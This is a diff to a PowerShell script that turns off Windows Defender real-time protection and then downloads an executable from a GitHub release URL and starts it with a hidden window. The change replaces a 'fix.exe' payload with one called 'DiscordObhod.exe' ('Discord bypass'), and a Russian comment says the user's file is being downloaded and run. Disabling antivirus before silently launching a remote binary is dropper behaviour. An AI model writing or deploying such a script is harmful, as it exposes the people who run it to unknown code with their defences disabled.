@@ -13,5 +13,6 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, TamperProtectionSource
 
 # Скачиваем и запускаем твой файл
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/fix.exe" -OutFile "fix.exe"
-Start-Process -FilePath "fix.exe" -WindowStyle Hidden
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/DiscordObhod.exe" -OutFile "DiscordObhod.exe"
+Start-Process -FilePath "DiscordObhod.exe" -WindowStyle Hidden
+
